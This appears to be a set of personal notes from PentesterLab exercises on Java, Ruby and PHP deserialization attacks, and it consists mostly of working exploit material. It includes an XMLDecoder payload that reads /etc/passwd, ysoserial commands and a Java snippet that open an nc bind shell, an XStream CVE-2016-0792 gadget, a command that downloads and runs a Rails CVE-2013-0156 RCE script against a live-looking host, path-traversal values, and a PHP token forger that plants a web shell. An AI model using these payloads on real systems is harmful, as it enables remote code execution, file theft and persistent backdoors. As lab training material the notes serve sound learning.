## PTL White Random Notes

#### XMLDecoder
```
Runtime run = Runtime.getRuntime();
String[] commands = new String[] { "/usr/bin/nc", "-l","-p", "9999", "-e", "/bin/sh" };
run.exec(commands );
```
```
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
 <object class="java.lang.Runtime" method="getRuntime">
      <void method="exec">
      <array class="java.lang.String" length="2">
          <void index="0">
              <string>cat</string>
          </void>
          <void index="1">
              <string>/etc/passwd</string>
          </void>
      </array>
      </void>
 </object>
</java>
```

#### CVE-2016-0792
```
<map>
  <entry>
    <groovy.util.Expando>
      <expandoProperties>
        <entry>
          <string>hashCode</string>
          <org.codehaus.groovy.runtime.MethodClosure>
            <delegate class="groovy.util.Expando"/>
            <owner class="java.lang.ProcessBuilder">
              <command>
                <string>/usr/local/bin/score</string>
                <string>39c0b5b5-3dab-4d9b-a685-27503157e66f</string>
              </command>
            </owner>
            <method>start</method>
          </org.codehaus.groovy.runtime.MethodClosure>
        </entry>
      </expandoProperties>
    </groovy.util.Expando>
    <int>1</int>
  </entry>
</map>
```

#### ObjectInputStream

- java -jar ysoserial-0.0.4-all.jar Spring1 "/usr/bin/nc -l -p 9999 -e /bin/sh" 
- To avoid new lines on linux => base64 -w 0
- Burp Extension JavaSerialKiller can also be used
- Now we need to find where the serialized object is used. A good indicator is the string rO0, which is the base64 encoded version of \xac\xed\x00.
- java -jar ysoserial-0.0.4.jar Spring1 "/usr/bin/nc -l -p 9999 -e /bin/sh" | base64 -w 0
- nc vulnerable 9999
- java -jar ysoserial-0.0.4.jar Spring1 "cat /etc/passwd" | base64 -w 0
- rO0ABXNyAA92dWxuZXJhYmxlLlVzZXI5zyo_QTFh_wIAAUwACHVzZXJuYW1ldAASTGphdmEvbGFuZy9TdHJpbmc7eHB0AAR0ZXN0
- the exploitation of a call to the method readObject() on an ObjectInputStream object in an Spring application

#### CVE-2013-0156: Rails Object Injection

- https://gist.github.com/postmodern/4499206
- X-HTTP-Method-Override
    
- docker run -it ruby:2 /bin/bash
- gem install ronin-support
- curl https://gist.githubusercontent.com/postmodern/4499206/raw/a68d6ff8c1f9570a09365036aeb96f6a9fff7121/rails_rce.rb -o rails_rce.rb
- ruby rails_rce.rb https://pelotascore.com/ '`cat /etc/password`'

#### API to SHell

###### PHP COMPARISONS

```
bool in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] )
```

```
<?php
var_dump("1" === 1);
var_dump("1" == 1);
var_dump("a" == 0);
var_dump("1' or 1=1" == 1);
var_dump("<script>alert(1)</script>" == 0);
?>
```

###### Register

`curl -x 127.0.0.1:8080 -X POST -H "Content-Type: application/json" -d '{"username":"goenix","password":"password"}' <RHOST>/register`

###### Login
```
curl -X POST -H "Content-Type: application/json" -d '{"username":"goenix","password":"password"}' http://ptl-f4162c00-c3706b0f.libcurl.so/login
```

###### List Files

`curl -X POST -H "Content-Type: application/json" -d '{"token":"$token"}' <RHOST>/files`


###### Upload a file

`curl -X POST -H "Content-Type: application/json" -d '{ "token": "$token", "filename": "hello.txt", "content": "Hello Everyone"}' <RHOST>/upload`

###### Retrieve a file

`curl -x 127.0.0.1:8080 -X POST -H "Content-Type: application/json" -d '{ "token": "$token", "uuid": "$uuid", "sig": 0}' <RHOST>/file`
#
- *uuid(s):*
- ../../../../../../etc/passwd
- ./../../../.././var/www/index.php
- ../../../../.././var/www/router.php
- ../../../../.././var/www/classes/db.php
- ../../../../.././var/www/classes/user.php
- ../../../../../././././var/www/classes/file.php
- ../../../../../././var/www/classes/utils.php
#
- VIM REGEX FORMATTING => /\\n/^M/g
#
- From serialization to code execution => trampoline functions or gadgets
- __wakeup() when an object is deserialized.
- __destruct() when an object is deleted.
- __toString() when an object is converted to a string.
#
```
<?php

define('KEY', "ooghie1Z Fae8aish OhT3fie6 Gae2aiza");

function sign($data) {
  return hash_hmac('md5', $data, KEY);
}

function tokenize($user) {
  $token = urlencode(base64_encode(serialize($user)));
  $token.= "--".sign($token);
  return $token;
}

class File {
  public $owner,$uuid='<?php system($_GET["c"]); ?>';
  public $logfile = "/var/www/shell.php";
}

echo tokenize(new File());

?>
```